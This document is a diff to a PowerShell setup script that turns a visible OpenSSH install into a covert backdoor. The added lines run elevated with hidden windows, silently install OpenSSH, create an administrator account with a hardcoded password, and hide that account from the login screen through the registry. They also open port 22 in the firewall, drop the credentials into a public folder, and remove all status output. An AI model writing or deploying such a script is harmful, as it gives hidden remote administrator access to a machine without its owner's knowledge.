@@ -1,34 +1,37 @@
-# Self-elevate
+# Self-elevate hidden
 if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)) {
-    Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
+    Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs -WindowStyle Hidden
     exit
 }
 
-# Install OpenSSH
-Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
-
-# Wait a sec for install to finish
+# Download and install OpenSSH
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+$url = "https://github.com/PowerShell/Win32-OpenSSH/releases/download/v9.5.0.0p1-Beta/OpenSSH-Win64-v9.5.0.0.msi"
+$msiPath = "$env:TEMP\OpenSSH.msi"
+Invoke-WebRequest -Uri $url -OutFile $msiPath
+Start-Process msiexec.exe -ArgumentList "/i `"$msiPath`" /qn" -Wait
 Start-Sleep -Seconds 5
 
-# Start sshd
+# Start SSH
 try {
     Start-Service sshd
     Set-Service -Name sshd -StartupType 'Automatic'
-    Write-Host "sshd started successfully"
-} catch {
-    Write-Host "sshd failed to start: $_"
-}
+} catch {}
 
-# Load System.Web assembly for password generation
-Add-Type -AssemblyName System.Web
-
+# Create user with hardcoded password
 $username = "remoteuser"
-$password = [System.Web.Security.Membership]::GeneratePassword(12, 2)
+$password = "HK3TbYFwvia0pLE9lWGI"
 net user $username $password /add
 net localgroup Administrators $username /add
 
+# Hide user from login screen
+$regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
+New-Item -Path $regPath -Force | Out-Null
+New-ItemProperty -Path $regPath -Name $username -Value 0 -PropertyType DWORD -Force | Out-Null
+
+# Firewall rule
+New-NetFirewallRule -Name "OpenSSH" -DisplayName "OpenSSH SSH Server" -Direction Inbound -Protocol TCP -LocalPort 22 -Action Allow -ErrorAction SilentlyContinue
+
+# Save creds
 $creds = "Username: $username`nPassword: $password"
 Set-Content -Path "C:\Users\Public\ssh_creds.txt" -Value $creds
-
-Write-Host "Done. Creds saved to C:\Users\Public\ssh_creds.txt"
-Pause
